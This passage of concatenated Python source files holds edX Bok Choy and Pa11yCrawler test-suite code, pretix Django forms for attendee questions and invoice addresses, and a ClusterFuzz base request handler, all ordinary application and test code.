            report_dir=report_dir,
        )
        return expected_statement

    def test_default(self):
        suite = Pa11yCrawler('')
        self.assertEqual(
            suite.cmd,
            self._expected_command(suite.pa11y_report_dir, suite.start_urls)
        )

    def test_get_test_course(self):
        suite = Pa11yCrawler('')
        suite.get_test_course()
        self._mock_sh.assert_has_calls([
            call(
                'wget {targz} -O {dir}demo_course.tar.gz'.format(targz=suite.tar_gz_file, dir=suite.imports_dir)),
            call(
                'tar zxf {dir}demo_course.tar.gz -C {dir}'.format(dir=suite.imports_dir)),
        ])

    def test_generate_html_reports(self):
        suite = Pa11yCrawler('')
        suite.generate_html_reports()
        self._mock_sh.assert_has_calls([
            call(
                'pa11ycrawler json-to-html --pa11ycrawler-reports-dir={}'.format(suite.pa11y_report_dir)),
        ])

"""
Class used for defining and running Bok Choy acceptance test suite
"""
from time import sleep
from urllib import urlencode

from common.test.acceptance.fixtures.course import CourseFixture, FixtureError

from path import Path as path
from paver.easy import sh, BuildFailure
from pavelib.utils.test.suites.suite import TestSuite
from pavelib.utils.envs import Env
from pavelib.utils.test import bokchoy_utils
from pavelib.utils.test import utils as test_utils

import os

try:
    from pygments.console import colorize
except ImportError:
    colorize = lambda color, text: text

__test__ = False  # do not collect

DEFAULT_NUM_PROCESSES = 1
DEFAULT_VERBOSITY = 2


class BokChoyTestSuite(TestSuite):
    """
    TestSuite for running Bok Choy tests
    Properties (below is a subset):
      test_dir - parent directory for tests
      log_dir - directory for test output
      report_dir - directory for reports (e.g., coverage) related to test execution
      xunit_report - directory for xunit-style output (xml)
      fasttest - when set, skip various set-up tasks (e.g., collectstatic)
      serversonly - prepare and run the necessary servers, only stopping when interrupted with Ctrl-C
      testsonly - assume servers are running (as per above) and run tests with no setup or cleaning of environment
      test_spec - when set, specifies test files, classes, cases, etc. See platform doc.
      default_store - modulestore to use when running tests (split or draft)
      num_processes - number of processes or threads to use in tests. Recommendation is that this
      is less than or equal to the number of available processors.
      verify_xss - when set, check for XSS vulnerabilities in the page HTML.
      See nosetest documentation: http://nose.readthedocs.org/en/latest/usage.html
    """
    def __init__(self, *args, **kwargs):
        super(BokChoyTestSuite, self).__init__(*args, **kwargs)
        self.test_dir = Env.BOK_CHOY_DIR / kwargs.get('test_dir', 'tests')
        self.log_dir = Env.BOK_CHOY_LOG_DIR
        self.report_dir = kwargs.get('report_dir', Env.BOK_CHOY_REPORT_DIR)
        self.xunit_report = self.report_dir / "xunit.xml"
        self.cache = Env.BOK_CHOY_CACHE
        self.fasttest = kwargs.get('fasttest', False)
        self.serversonly = kwargs.get('serversonly', False)
        self.testsonly = kwargs.get('testsonly', False)
        self.test_spec = kwargs.get('test_spec', None)
        self.default_store = kwargs.get('default_store', None)
        self.verbosity = kwargs.get('verbosity', DEFAULT_VERBOSITY)
        self.num_processes = kwargs.get('num_processes', DEFAULT_NUM_PROCESSES)
        self.verify_xss = kwargs.get('verify_xss', os.environ.get('VERIFY_XSS', False))                    
        self.extra_args = kwargs.get('extra_args', '')
        self.har_dir = self.log_dir / 'hars'
        self.a11y_file = Env.BOK_CHOY_A11Y_CUSTOM_RULES_FILE
        self.imports_dir = kwargs.get('imports_dir', None)
        self.coveragerc = kwargs.get('coveragerc', None)
        self.save_screenshots = kwargs.get('save_screenshots', False)

    def __enter__(self):
        super(BokChoyTestSuite, self).__enter__()

        # Ensure that we have a directory to put logs and reports
        self.log_dir.makedirs_p()
        self.har_dir.makedirs_p()
        self.report_dir.makedirs_p()
        test_utils.clean_reports_dir()      # pylint: disable=no-value-for-parameter

        if not (self.fasttest or self.skip_clean or self.testsonly):
            test_utils.clean_test_files()

        msg = colorize('green', "Checking for mongo, memchache, and mysql...")
        print msg
        bokchoy_utils.check_services()

        if not self.testsonly:
            self.prepare_bokchoy_run()
        else:
            # load data in db_fixtures
            self.load_data()

        msg = colorize('green', "Confirming servers have started...")
        print msg
        bokchoy_utils.wait_for_test_servers()
        try:
            # Create course in order to seed forum data underneath. This is
            # a workaround for a race condition. The first time a course is created;
            # role permissions are set up for forums.
            CourseFixture('foobar_org', '1117', 'seed_forum', 'seed_foo').install()
            print 'Forums permissions/roles data has been seeded'
        except FixtureError:
            # this means it's already been done
            pass

        if self.serversonly:
            self.run_servers_continuously()

    def __exit__(self, exc_type, exc_value, traceback):
        super(BokChoyTestSuite, self).__exit__(exc_type, exc_value, traceback)

        # Using testsonly will leave all fixtures in place (Note: the db will also be dirtier.)
        if self.testsonly:
            msg = colorize('green', 'Running in testsonly mode... SKIPPING database cleanup.')
            print msg
        else:
            # Clean up data we created in the databases
            msg = colorize('green', "Cleaning up databases...")
            print msg
            sh("./manage.py lms --settings bok_choy flush --traceback --noinput")
            bokchoy_utils.clear_mongo()

    def verbosity_processes_string(self):
        """
        Multiprocessing, xunit, color, and verbosity do not work well together. We need to construct
        the proper combination for use with nosetests.
        """
        substring = []

        if self.verbosity != DEFAULT_VERBOSITY and self.num_processes != DEFAULT_NUM_PROCESSES:
            msg = 'Cannot pass in both num_processors and verbosity. Quitting'
            raise BuildFailure(msg)

        if self.num_processes != 1:
            # Construct "multiprocess" nosetest substring
            substring = [
                "--with-xunitmp --xunitmp-file={}".format(self.xunit_report),
                "--processes={}".format(self.num_processes),
                "--no-color --process-timeout=1200"
            ]

        else:
            substring = [
                "--with-xunit",
                "--xunit-file={}".format(self.xunit_report),
                "--verbosity={}".format(self.verbosity),
            ]

        return " ".join(substring)

    def prepare_bokchoy_run(self):
        """
        Sets up and starts servers for a Bok Choy run. If --fasttest is not
        specified then static assets are collected
        """
        sh("{}/scripts/reset-test-db.sh".format(Env.REPO_ROOT))

        if not self.fasttest:
            self.generate_optimized_static_assets()

        # Clear any test data already in Mongo or MySQLand invalidate
        # the cache
        bokchoy_utils.clear_mongo()
        self.cache.flush_all()

        # load data in db_fixtures
        self.load_data()

        # load courses if self.imports_dir is set
        self.load_courses()

        # Ensure the test servers are available
        msg = colorize('green', "Confirming servers are running...")
        print msg
        bokchoy_utils.start_servers(self.default_store, self.coveragerc)

    def load_courses(self):
        """
        Loads courses from self.imports_dir.

        Note: self.imports_dir is the directory that contains the directories
        that have courses in them. For example, if the course is located in
        `test_root/courses/test-example-course/`, self.imports_dir should be
        `test_root/courses/`.
        """
        msg = colorize('green', "Importing courses from {}...".format(self.imports_dir))
        print msg

        if self.imports_dir:
            sh(
                "DEFAULT_STORE={default_store}"
                " ./manage.py cms --settings=bok_choy import {import_dir}".format(
                    default_store=self.default_store,
                    import_dir=self.imports_dir
                )
            )

    def load_data(self):
        """
        Loads data into database from db_fixtures
        """
        print 'Loading data from json fixtures in db_fixtures directory'
        sh(
            "DEFAULT_STORE={default_store}"
            " ./manage.py lms --settings bok_choy loaddata --traceback"
            " common/test/db_fixtures/*.json".format(
                default_store=self.default_store,
            )
        )

    def run_servers_continuously(self):
        """
        Infinite loop. Servers will continue to run in the current session unless interrupted.
        """
        print 'Bok-choy servers running. Press Ctrl-C to exit...\n'
        print 'Note: pressing Ctrl-C multiple times can corrupt noseid files and system state. Just press it once.\n'

        while True:
            try:
                sleep(10000)
            except KeyboardInterrupt:
                print "Stopping bok-choy servers.\n"
                break

    @property
    def cmd(self):
        """
        This method composes the nosetests command to send to the terminal. If nosetests aren't being run,
         the command returns an empty string.
        """
        # Default to running all tests if no specific test is specified
        if not self.test_spec:
            test_spec = self.test_dir
        else:
            test_spec = self.test_dir / self.test_spec

        # Skip any additional commands (such as nosetests) if running in
        # servers only mode
        if self.serversonly:
            return ""

        # Construct the nosetests command, specifying where to save
        # screenshots and XUnit XML reports
        cmd = [
            "DEFAULT_STORE={}".format(self.default_store),
            "SCREENSHOT_DIR='{}'".format(self.log_dir),
            "BOK_CHOY_HAR_DIR='{}'".format(self.har_dir),
            "BOKCHOY_A11Y_CUSTOM_RULES_FILE='{}'".format(self.a11y_file),
            "SELENIUM_DRIVER_LOG_DIR='{}'".format(self.log_dir),
            "VERIFY_XSS='{}'".format(self.verify_xss),
            "nosetests",
            test_spec,
            "{}".format(self.verbosity_processes_string())
        ]
        if self.pdb:
            cmd.append("--pdb")
        if self.save_screenshots:
            cmd.append("--with-save-baseline")
        cmd.append(self.extra_args)

        cmd = (" ").join(cmd)
        return cmd


class Pa11yCrawler(BokChoyTestSuite):
    """
    Sets up test environment with mega-course loaded, and runs pa11ycralwer
    against it.
    """

    def __init__(self, *args, **kwargs):
        super(Pa11yCrawler, self).__init__(*args, **kwargs)
        self.course_key = kwargs.get('course_key')
        if self.imports_dir:
            # If imports_dir has been specified, assume the files are
            # already there -- no need to fetch them from github. This
            # allows someome to crawl a different course. They are responsible
            # for putting it, un-archived, in the directory.
            self.should_fetch_course = False
        else:
            # Otherwise, obey `--skip-fetch` command and use the default
            # test course.  Note that the fetch will also be skipped when
            # using `--fast`.
            self.should_fetch_course = kwargs.get('should_fetch_course')
            self.imports_dir = path('test_root/courses/')

        self.pa11y_report_dir = os.path.join(self.report_dir, 'pa11ycrawler_reports')
        self.tar_gz_file = "https://github.com/edx/demo-test-course/archive/master.tar.gz"

        self.start_urls = []
        auto_auth_params = {
            "redirect": 'true',
            "staff": 'true',
            "course_id": self.course_key,
        }
        cms_params = urlencode(auto_auth_params)
        self.start_urls.append("\"http://localhost:8031/auto_auth?{}\"".format(cms_params))

        sequence_url = "/api/courses/v1/blocks/?{}".format(
            urlencode({
                "course_id": self.course_key,
                "depth": "all",
                "all_blocks": "true",
            })
        )
        auto_auth_params.update({'redirect_to': sequence_url})
        lms_params = urlencode(auto_auth_params)
        self.start_urls.append("\"http://localhost:8003/auto_auth?{}\"".format(lms_params))

    def __enter__(self):
        if self.should_fetch_course:
            self.get_test_course()
        super(Pa11yCrawler, self).__enter__()

    def get_test_course(self):
        """
        Fetches the test course.
        """
        self.imports_dir.makedirs_p()
        zipped_course = self.imports_dir + 'demo_course.tar.gz'

        msg = colorize('green', "Fetching the test course from github...")
        print msg

        sh(
            'wget {tar_gz_file} -O {zipped_course}'.format(
                tar_gz_file=self.tar_gz_file,
                zipped_course=zipped_course,
            )
        )

        msg = colorize('green', "Uncompressing the test course...")
        print msg

        sh(
            'tar zxf {zipped_course} -C {courses_dir}'.format(
                zipped_course=zipped_course,
                courses_dir=self.imports_dir,
            )
        )

    def generate_html_reports(self):
        """
        Runs pa11ycrawler json-to-html
        """
        cmd_str = (
            'pa11ycrawler json-to-html --pa11ycrawler-reports-dir={report_dir}'
        ).format(report_dir=self.pa11y_report_dir)

        sh(cmd_str)

    @property
    def cmd(self):
        """
        Runs pa11ycrawler as staff user against the test course.
        """
        cmd_str = (
            'pa11ycrawler run {start_urls} '
            '--pa11ycrawler-allowed-domains={allowed_domains} '
            '--pa11ycrawler-reports-dir={report_dir} '
            '--pa11ycrawler-deny-url-matcher={dont_go_here} '
            '--pa11y-reporter="{reporter}" '
            '--depth-limit={depth} '
        ).format(
            start_urls=' '.join(self.start_urls),
            allowed_domains='localhost',
            report_dir=self.pa11y_report_dir,
            reporter="1.0-json",
            dont_go_here="logout",
            depth="6",
        )
        return cmd_str

import copy
import logging
from decimal import Decimal

import dateutil.parser
import pytz
import vat_moss.errors
import vat_moss.id
from django import forms
from django.contrib import messages
from django.core.exceptions import ValidationError
from django.utils.safestring import mark_safe
from django.utils.translation import ugettext_lazy as _

from pretix.base.forms.widgets import (
    BusinessBooleanRadio, DatePickerWidget, SplitDateTimePickerWidget,
    TimePickerWidget, UploadedFileWidget,
)
from pretix.base.models import InvoiceAddress, Question
from pretix.base.models.tax import EU_COUNTRIES
from pretix.base.settings import PERSON_NAME_SCHEMES
from pretix.base.templatetags.rich_text import rich_text
from pretix.control.forms import SplitDateTimeField
from pretix.helpers.i18n import get_format_without_seconds
from pretix.presale.signals import question_form_fields

logger = logging.getLogger(__name__)


class NamePartsWidget(forms.MultiWidget):
    widget = forms.TextInput

    def __init__(self, scheme: dict, field: forms.Field, attrs=None):
        widgets = []
        self.scheme = scheme
        self.field = field
        for fname, label, size in self.scheme['fields']:
            a = copy.copy(attrs) or {}
            a['data-fname'] = fname
            widgets.append(self.widget(attrs=a))
        super().__init__(widgets, attrs)

    def decompress(self, value):
        if value is None:
            return None
        data = []
        for i, field in enumerate(self.scheme['fields']):
            fname, label, size = field
            data.append(value.get(fname, ""))
        if '_legacy' in value and not data[-1]:
            data[-1] = value.get('_legacy', '')
        return data

    def render(self, name: str, value, attrs=None, renderer=None) -> str:
        if not isinstance(value, list):
            value = self.decompress(value)
        output = []
        final_attrs = self.build_attrs(attrs or dict())
        if 'required' in final_attrs:
            del final_attrs['required']
        id_ = final_attrs.get('id', None)
        for i, widget in enumerate(self.widgets):
            try:
                widget_value = value[i]
            except (IndexError, TypeError):
                widget_value = None
            if id_:
                final_attrs = dict(
                    final_attrs,
                    id='%s_%s' % (id_, i),
                    title=self.scheme['fields'][i][1],
                    placeholder=self.scheme['fields'][i][1],
                )
                final_attrs['data-size'] = self.scheme['fields'][i][2]
            output.append(widget.render(name + '_%s' % i, widget_value, final_attrs, renderer=renderer))
        return mark_safe(self.format_output(output))

    def format_output(self, rendered_widgets) -> str:
        return '<div class="nameparts-form-group">%s</div>' % ''.join(rendered_widgets)


class NamePartsFormField(forms.MultiValueField):
    widget = NamePartsWidget

    def compress(self, data_list) -> dict:
        data = {}
        data['_scheme'] = self.scheme_name
        for i, value in enumerate(data_list):
            data[self.scheme['fields'][i][0]] = value or ''
        return data

    def __init__(self, *args, **kwargs):
        fields = []
        defaults = {
            'widget': self.widget,
            'max_length': kwargs.pop('max_length', None),
        }
        self.scheme_name = kwargs.pop('scheme')
        self.scheme = PERSON_NAME_SCHEMES.get(self.scheme_name)
        self.one_required = kwargs.get('required', True)
        require_all_fields = kwargs.pop('require_all_fields', False)
        kwargs['required'] = False
        kwargs['widget'] = (kwargs.get('widget') or self.widget)(
            scheme=self.scheme, field=self, **kwargs.pop('widget_kwargs', {})
        )
        defaults.update(**kwargs)
        for fname, label, size in self.scheme['fields']:
            defaults['label'] = label
            field = forms.CharField(**defaults)
            field.part_name = fname
            fields.append(field)
        super().__init__(
            fields=fields, require_all_fields=False, *args, **kwargs
        )
        self.require_all_fields = require_all_fields
        self.required = self.one_required

    def clean(self, value) -> dict:
        value = super().clean(value)
        if self.one_required and (not value or not any(v for v in value)):
            raise forms.ValidationError(self.error_messages['required'], code='required')
        if self.require_all_fields and not all(v for v in value):
            raise forms.ValidationError(self.error_messages['incomplete'], code='required')
        return value


class BaseQuestionsForm(forms.Form):
    """
    This form class is responsible for asking order-related questions. This includes
    the attendee name for admission tickets, if the corresponding setting is enabled,
    as well as additional questions defined by the organizer.
    """

    def __init__(self, *args, **kwargs):
        """
        Takes two additional keyword arguments:

        :param cartpos: The cart position the form should be for
        :param event: The event this belongs to
        """
        cartpos = self.cartpos = kwargs.pop('cartpos', None)
        orderpos = self.orderpos = kwargs.pop('orderpos', None)
        pos = cartpos or orderpos
        item = pos.item
        questions = pos.item.questions_to_ask
        event = kwargs.pop('event')

        super().__init__(*args, **kwargs)

        if item.admission and event.settings.attendee_names_asked:
            self.fields['attendee_name_parts'] = NamePartsFormField(
                max_length=255,
                required=event.settings.attendee_names_required,
                scheme=event.settings.name_scheme,
                label=_('Attendee name'),
                initial=(cartpos.attendee_name_parts if cartpos else orderpos.attendee_name_parts),
            )
        if item.admission and event.settings.attendee_emails_asked:
            self.fields['attendee_email'] = forms.EmailField(
                required=event.settings.attendee_emails_required,
                label=_('Attendee email'),
                initial=(cartpos.attendee_email if cartpos else orderpos.attendee_email)
            )

        for q in questions:
            # Do we already have an answer? Provide it as the initial value
            answers = [a for a in pos.answerlist if a.question_id == q.id]
            if answers:
                initial = answers[0]
            else:
                initial = None
            tz = pytz.timezone(event.settings.timezone)
            help_text = rich_text(q.help_text)
            if q.type == Question.TYPE_BOOLEAN:
                if q.required:
                    # For some reason, django-bootstrap3 does not set the required attribute
                    # itself.
                    widget = forms.CheckboxInput(attrs={'required': 'required'})
                else:
                    widget = forms.CheckboxInput()

                if initial:
                    initialbool = (initial.answer == "True")
                else:
                    initialbool = False

                field = forms.BooleanField(
                    label=q.question, required=q.required,                    
                    help_text=help_text,
                    initial=initialbool, widget=widget,
                )
            elif q.type == Question.TYPE_NUMBER:
                field = forms.DecimalField(
                    label=q.question, required=q.required,                    
                    help_text=q.help_text,
                    initial=initial.answer if initial else None,
                    min_value=Decimal('0.00'),
                )
            elif q.type == Question.TYPE_STRING:
                field = forms.CharField(
                    label=q.question, required=q.required,                    
                    help_text=help_text,
                    initial=initial.answer if initial else None,
                )
            elif q.type == Question.TYPE_TEXT:
                field = forms.CharField(
                    label=q.question, required=q.required,                    
                    help_text=help_text,
                    widget=forms.Textarea,
                    initial=initial.answer if initial else None,
                )
            elif q.type == Question.TYPE_CHOICE:
                field = forms.ModelChoiceField(
                    queryset=q.options,
                    label=q.question, required=q.required,                    
                    help_text=help_text,
                    widget=forms.Select,
                    empty_label='',
                    initial=initial.options.first() if initial else None,
                )
            elif q.type == Question.TYPE_CHOICE_MULTIPLE:
                field = forms.ModelMultipleChoiceField(
                    queryset=q.options,
                    label=q.question, required=q.required,                    
                    help_text=help_text,
                    widget=forms.CheckboxSelectMultiple,
                    initial=initial.options.all() if initial else None,
                )
            elif q.type == Question.TYPE_FILE:
                field = forms.FileField(
                    label=q.question, required=q.required,                    
                    help_text=help_text,
                    initial=initial.file if initial else None,
                    widget=UploadedFileWidget(position=pos, event=event, answer=initial),
                )
            elif q.type == Question.TYPE_DATE:
                field = forms.DateField(
                    label=q.question, required=q.required,                    
                    help_text=help_text,
                    initial=dateutil.parser.parse(initial.answer).date() if initial and initial.answer else None,
                    widget=DatePickerWidget(),
                )
            elif q.type == Question.TYPE_TIME:
                field = forms.TimeField(
                    label=q.question, required=q.required,                    
                    help_text=help_text,
                    initial=dateutil.parser.parse(initial.answer).time() if initial and initial.answer else None,
                    widget=TimePickerWidget(time_format=get_format_without_seconds('TIME_INPUT_FORMATS')),
                )
            elif q.type == Question.TYPE_DATETIME:
                field = SplitDateTimeField(
                    label=q.question, required=q.required,                    
                    help_text=help_text,
                    initial=dateutil.parser.parse(initial.answer).astimezone(tz) if initial and initial.answer else None,
                    widget=SplitDateTimePickerWidget(time_format=get_format_without_seconds('TIME_INPUT_FORMATS')),
                )
            field.question = q
            if answers:
                # Cache the answer object for later use
                field.answer = answers[0]
            self.fields['question_%s' % q.id] = field

        responses = question_form_fields.send(sender=event, position=pos)
        data = pos.meta_info_data
        for r, response in sorted(responses, key=lambda r: str(r[0])):
            for key, value in response.items():
                # We need to be this explicit, since OrderedDict.update does not retain ordering
                self.fields[key] = value
                value.initial = data.get('question_form_data', {}).get(key)


class BaseInvoiceAddressForm(forms.ModelForm):
    vat_warning = False

    class Meta:
        model = InvoiceAddress
        fields = ('is_business', 'company', 'name_parts', 'street', 'zipcode', 'city', 'country', 'vat_id',
                  'internal_reference', 'beneficiary')
        widgets = {
            'is_business': BusinessBooleanRadio,
            'street': forms.Textarea(attrs={'rows': 2, 'placeholder': _('Street and Number')}),
            'beneficiary': forms.Textarea(attrs={'rows': 3}),
            'company': forms.TextInput(attrs={'data-display-dependency': '#id_is_business_1'}),
            'vat_id': forms.TextInput(attrs={'data-display-dependency': '#id_is_business_1'}),
            'internal_reference': forms.TextInput,
        }
        labels = {
            'is_business': ''
        }

    def __init__(self, *args, **kwargs):
        self.event = event = kwargs.pop('event')
        self.request = kwargs.pop('request', None)
        self.validate_vat_id = kwargs.pop('validate_vat_id')
        self.all_optional = kwargs.pop('all_optional', False)
        super().__init__(*args, **kwargs)
        if not event.settings.invoice_address_vatid:
            del self.fields['vat_id']

        if not event.settings.invoice_address_required or self.all_optional:
            for k, f in self.fields.items():
                f.required = False
                f.widget.is_required = False
                if 'required' in f.widget.attrs:
                    del f.widget.attrs['required']
        elif event.settings.invoice_address_company_required and not self.all_optional:
            self.initial['is_business'] = True

            self.fields['is_business'].widget = BusinessBooleanRadio(require_business=True)
            self.fields['company'].required = True
            self.fields['company'].widget.is_required = True
            self.fields['company'].widget.attrs['required'] = 'required'
            del self.fields['company'].widget.attrs['data-display-dependency']
            if 'vat_id' in self.fields:
                del self.fields['vat_id'].widget.attrs['data-display-dependency']

        self.fields['name_parts'] = NamePartsFormField(
            max_length=255,
            required=event.settings.invoice_name_required and not self.all_optional,
            scheme=event.settings.name_scheme,
            label=_('Name'),
            initial=(self.instance.name_parts if self.instance else self.instance.name_parts),
        )
        if event.settings.invoice_address_required and not event.settings.invoice_address_company_required and not self.all_optional:
            self.fields['name_parts'].widget.attrs['data-required-if'] = '#id_is_business_0'
            self.fields['name_parts'].widget.attrs['data-no-required-attr'] = '1'
            self.fields['company'].widget.attrs['data-required-if'] = '#id_is_business_1'

        if not event.settings.invoice_address_beneficiary:
            del self.fields['beneficiary']

    def clean(self):
        data = self.cleaned_data
        if not data.get('is_business'):
            data['company'] = ''
        if self.event.settings.invoice_address_required:
            if data.get('is_business') and not data.get('company'):
                raise ValidationError(_('You need to provide a company name.'))
            if not data.get('is_business') and not data.get('name_parts'):
                raise ValidationError(_('You need to provide your name.'))

        if 'vat_id' in self.changed_data or not data.get('vat_id'):
            self.instance.vat_id_validated = False

        self.instance.name_parts = data.get('name_parts')

        if self.validate_vat_id and self.instance.vat_id_validated and 'vat_id' not in self.changed_data:
            pass
        elif self.validate_vat_id and data.get('is_business') and data.get('country') in EU_COUNTRIES and data.get('vat_id'):
            if data.get('vat_id')[:2] != str(data.get('country')):
                raise ValidationError(_('Your VAT ID does not match the selected country.'))
            try:
                result = vat_moss.id.validate(data.get('vat_id'))
                if result:
                    country_code, normalized_id, company_name = result
                    self.instance.vat_id_validated = True
                    self.instance.vat_id = normalized_id
            except (vat_moss.errors.InvalidError, ValueError):
                raise ValidationError(_('This VAT ID is not valid. Please re-check your input.'))
            except vat_moss.errors.WebServiceUnavailableError:
                logger.exception('VAT ID checking failed for country {}'.format(data.get('country')))
                self.instance.vat_id_validated = False
                if self.request and self.vat_warning:
                    messages.warning(self.request, _('Your VAT ID could not be checked, as the VAT checking service of '
                                                     'your country is currently not available. We will therefore '
                                                     'need to charge VAT on your invoice. You can get the tax amount '
                                                     'back via the VAT reimbursement process.'))
            except vat_moss.errors.WebServiceError:
                logger.exception('VAT ID checking failed for country {}'.format(data.get('country')))
                self.instance.vat_id_validated = False
                if self.request and self.vat_warning:
                    messages.warning(self.request, _('Your VAT ID could not be checked, as the VAT checking service of '
                                                     'your country returned an incorrect result. We will therefore '
                                                     'need to charge VAT on your invoice. Please contact support to '
                                                     'resolve this manually.'))
        else:
            self.instance.vat_id_validated = False


class BaseInvoiceNameForm(BaseInvoiceAddressForm):

    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)
        for f in list(self.fields.keys()):
            if f != 'name':
                del self.fields[f]


# Copyright 2019 Google LLC
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#      http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.
"""The superclass of all handlers."""

from builtins import object
from future import standard_library
standard_library.install_aliases()
import base64
import cgi
import datetime
import json
import logging
import os
import re
import sys
import traceback
import urllib.parse

import jinja2
import webapp2

from base import utils
from config import db_config
from config import local_config
from datastore import ndb
from google_cloud_utils import storage
from libs import auth
from libs import form
from libs import helpers
from system import environment


def add_jinja2_filter(name, fn):
  _JINJA_ENVIRONMENT.filters[name] = fn


class JsonEncoder(json.JSONEncoder):
  """Json encoder."""
  _EPOCH = datetime.datetime.utcfromtimestamp(0)

  def default(self, obj):  # pylint: disable=arguments-differ,method-hidden
    if isinstance(obj, ndb.Model):
      dict_obj = obj.to_dict()
      dict_obj['id'] = obj.key.id()
      return dict_obj
    elif isinstance(obj, datetime.datetime):
      return int((obj - self._EPOCH).total_seconds())
    elif hasattr(obj, 'to_dict'):
      return obj.to_dict()
    elif isinstance(obj, cgi.FieldStorage):
      return str(obj)
    else:
      raise Exception('Cannot serialise %s' % obj)


def format_time(dt):
  """Format datetime object for display."""
  return '{t.day} {t:%b} {t:%y} {t:%X} PDT'.format(t=dt)


def splitlines(text):
  """Split text into lines."""
  return text.splitlines()


def split_br(text):
  return re.split(r'\s*<br */>\s*', text, flags=re.IGNORECASE)


def encode_json(value):
  """Dump base64-encoded JSON string (to avoid XSS)."""
  return base64.b64encode(json.dumps(value, cls=JsonEncoder))


_JINJA_ENVIRONMENT = jinja2.Environment(
    loader=jinja2.FileSystemLoader(
        os.path.join(os.path.dirname(__file__), '..', 'templates')),
    extensions=['jinja2.ext.autoescape'],
    autoescape=True)
_MENU_ITEMS = []

add_jinja2_filter('json', encode_json)
add_jinja2_filter('format_time', format_time)
add_jinja2_filter('splitlines', splitlines)
add_jinja2_filter('split_br', split_br)
add_jinja2_filter('polymer_tag', lambda v: '{{%s}}' % v)


def add_menu(name, href):
  """Add menu item to the main navigation."""
  _MENU_ITEMS.append(_MenuItem(name, href))


def make_login_url(dest_url):
  """Make the switch account url."""
  return '/login?' + urllib.parse.urlencode({'dest': dest_url})


def make_logout_url(dest_url):
  """Make the switch account url."""
  return '/logout?' + urllib.parse.urlencode({
      'csrf_token': form.generate_csrf_token(),
      'dest': dest_url,
  })


class _MenuItem(object):
  """A menu item used for rendering an item in the main navigation."""

  def __init__(self, name, href):
    self.name = name
    self.href = href


class Handler(webapp2.RequestHandler):
  """A superclass for all handlers. It contains many convenient methods."""

  def is_cron(self):
    """Return true if the request is from a cron job."""
    return bool(self.request.headers.get('X-Appengine-Cron'))

  def render_forbidden(self, message):
    """Write HTML response for 403."""
    login_url = make_login_url(dest_url=self.request.url)
    user_email = helpers.get_user_email()
    if not user_email:
      self.redirect(login_url)
      return

    contact_string = db_config.get_value('contact_string')
    template_values = {
        'message': message,
        'user_email': helpers.get_user_email(),
        'login_url': login_url,
        'switch_account_url': login_url,
        'logout_url': make_logout_url(dest_url=self.request.url),
        'contact_string': contact_string,
    }
    self.render('error-403.html', template_values, 403)

  def _add_security_response_headers(self):
    """Add security-related headers to response."""
    self.response.headers['Strict-Transport-Security'] = (
        'max-age=2592000; includeSubdomains')
    self.response.headers['X-Content-Type-Options'] = 'nosniff'
    self.response.headers['X-Frame-Options'] = 'deny'

  def render(self, path, values=None, status=200):
    """Write HTML response."""
    if values is None:
      values = {}

    values['menu_items'] = _MENU_ITEMS
    values['is_oss_fuzz'] = utils.is_oss_fuzz()
    values['is_development'] = (
        environment.is_running_on_app_engine_development())
    values['is_logged_in'] = bool(helpers.get_user_email())

    # Only track analytics for non-admin users.
    values['ga_tracking_id'] = (
        local_config.GAEConfig().get('ga_tracking_id')
        if not auth.is_current_user_admin() else None)

    if values['is_logged_in']:
      values['switch_account_url'] = make_login_url(self.request.url)
      values['logout_url'] = make_logout_url(dest_url=self.request.url)

    template = _JINJA_ENVIRONMENT.get_template(path)

    self._add_security_response_headers()
    self.response.headers['Content-Type'] = 'text/html'
    self.response.out.write(template.render(values))
    self.response.set_status(status)

  def before_render_json(self, values, status):
    """A hook for modifying values before render_json."""

  def render_json(self, values, status=200):
    """Write JSON response."""
    self._add_security_response_headers()
    self.response.headers['Content-Type'] = 'application/json'
    self.before_render_json(values, status)
    self.response.out.write(json.dumps(values, cls=JsonEncoder))
    self.response.set_status(status)

  def handle_exception(self, exception, _):
    """Catch exception and format it properly."""
    try:

      status = 500
      values = {
          'message': exception.message,
          'email': helpers.get_user_email(),
          'traceDump': traceback.format_exc(),
          'status': status,
          'type': exception.__class__.__name__
      }
      if isinstance(exception, helpers.EarlyExitException):
        status = exception.status
        values = exception.to_dict()
      values['params'] = self.request.params.dict_of_lists()

      # 4XX is not our fault. Therefore, we hide the trace dump and log on
      # the INFO level.
      if status >= 400 and status <= 499:
        logging.info(json.dumps(values, cls=JsonEncoder))
        del values['traceDump']
      else:  # Other error codes should be logged with the EXCEPTION level.
        logging.exception(exception)

      if helpers.should_render_json(
          self.request.headers.get('accept', ''),
          self.response.headers.get('Content-Type')):
        self.render_json(values, status)
      else:
        if status == 403 or status == 401:
          self.render_forbidden(exception.message)
        else:
          self.render('error.html', values, status)
    except Exception:
      self.handle_exception_exception()

  def handle_exception_exception(self):
    """Catch exception in handle_exception and format it properly."""
    exception = sys.exc_info()[1]
    values = {'message': exception.message, 'traceDump': traceback.format_exc()}
    logging.exception(exception)
    if helpers.should_render_json(
        self.request.headers.get('accept', ''),
        self.response.headers.get('Content-Type')):
      self.render_json(values, 500)
    else:
      self.render('error.html', values, 500)

  def redirect(self, url, **kwargs):
    """Explicitly converts url to 'str', because webapp2.RequestHandler.redirect
    strongly requires 'str' but url might be an unicode string."""
    super(Handler, self).redirect(str(url), **kwargs)                    


class GcsUploadHandler(Handler):
  """A handler which uploads files to GCS."""

  def __init__(self, request, response):
    self.initialize(request, response)
    self.upload = None

  def get_upload(self):
    """Get uploads."""
    if self.upload:
      return self.upload

    upload_key = self.request.get('upload_key')
    if not upload_key:
      return None

    blob_info = storage.GcsBlobInfo.from_key(upload_key)
    if not blob_info:
      raise helpers.EarlyExitException('Failed to upload.', 500)

    self.upload = blob_info
    return self.upload

# Copyright 2019 Google LLC
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#      http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.
"""Login page."""

import datetime

from config import local_config
